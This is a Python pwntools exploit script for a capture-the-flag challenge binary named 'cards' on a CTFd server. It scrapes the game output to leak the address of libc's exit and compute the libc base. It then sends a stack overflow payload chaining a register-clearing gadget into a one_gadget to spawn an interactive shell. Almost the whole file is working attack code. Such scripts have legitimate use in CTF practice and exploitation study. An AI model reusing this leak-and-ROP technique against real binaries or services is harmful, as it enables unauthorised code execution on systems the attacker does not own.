#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenges.ctfd.io --port 30458 chess
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('cards')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30466)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    return process(["./ld-2.23.so",  "--library-path", ".", "./cards"] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc=ELF("libc.so.6")

io = start()
io.recvuntil("name :")
io.sendline("A"*62)

io.recvuntil("3) Quit")
io.sendline("1")

cardvals = b""
#io.interactive()

#leak exit

while True:
    cardvals = io.recvuntil(b"2) Stay")
    if b"Happy Joker" in cardvals:
        break
    io.sendline("1")

print(cardvals)
exit_addr = int(cardvals.split(b"\n")[-6].split(b"\t")[1])
libc.address = exit_addr - libc.symbols['exit']
print(hex(exit_addr))
print(hex(libc.symbols['exit']))





io.sendline("2")


#win
while True:
    result = io.recvuntil("2) Main Menu")
    if b"awarded" in result:
        break
    io.sendline("1")
    io.recvuntil(b"2) Stay")
    io.sendline("2")


io.sendline("2")
io.sendline("2")

io.recvuntil("winnings :")

#gdb.attach(io)

zero_rax = 0x000000000008b945 #xor rax, rax; ret;
one_gadget = 0x45226


io.sendline(b"B"*36 + p64(libc.address + zero_rax) + p64(libc.address + one_gadget))
io.interactive()
